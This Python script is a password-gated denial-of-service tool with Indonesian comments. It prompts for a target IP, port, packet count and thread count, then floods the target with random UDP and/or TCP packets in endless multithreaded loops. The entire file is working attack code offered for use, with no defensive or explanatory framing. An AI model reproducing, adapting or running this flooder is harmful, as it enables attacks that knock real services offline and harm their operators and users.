#!/usr/bin/env python3

import random
import socket
import threading
import os
import time

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def check_password():
    while True:
        password = input("Enter Password to Continue: ")
        if password == "william":
            print("Access Granted!")
            break
        else:
            print("Invalid Password! Please try again.")
            time.sleep(3)
            clear_screen()

def udp_attack(target_ip, port, packets):
    data = random._urandom(1024)  # Paket data sebesar 1024 bytes
    addr = (target_ip, port)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for _ in range(packets):
                s.sendto(data, addr)
            print("UDP Packet Sent!")
            time.sleep(0.1)  # Tambahkan delay untuk mengurangi beban CPU
        except socket.error:
            print(f"Failed to send UDP packet to {target_ip} on port {port}")
            time.sleep(0.5)  # Tambahkan delay untuk mengurangi beban CPU

def tcp_attack(target_ip, port, packets):
    data = random._urandom(1024)  # Paket data sebesar 1024 bytes
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, port))
            for _ in range(packets):
                s.send(data)
            print("TCP Packet Sent!")
            time.sleep(0.1)  # Tambahkan delay untuk mengurangi beban CPU
        except socket.error:
            s.close()
            print(f"Failed to send TCP packet to {target_ip} on port {port}")
            time.sleep(0.5)  # Tambahkan delay untuk mengurangi beban CPU

def main():
    clear_screen()
    check_password()
    time.sleep(2)
    clear_screen()

    print("Welcome to the Tool")

    target_ip = input("Enter Target IP: ")
    port = int(input("Enter Port: "))
    packets = int(input("Enter Packet Count: "))
    threads = int(input("Enter Thread Count: "))
    attack_type = input("Enter Attack Type (UDP/TCP/BOTH): ").upper()

    for _ in range(threads):
        if attack_type == "UDP":
            thread = threading.Thread(target=udp_attack, args=(target_ip, port, packets))
        elif attack_type == "TCP":
            thread = threading.Thread(target=tcp_attack, args=(target_ip, port, packets))
        elif attack_type == "BOTH":
            thread_udp = threading.Thread(target=udp_attack, args=(target_ip, port, packets))
            thread_tcp = threading.Thread(target=tcp_attack, args=(target_ip, port, packets))
            thread_udp.start()
            thread_tcp.start()
            continue
        thread.start()

if __name__ == "__main__":
    main() 
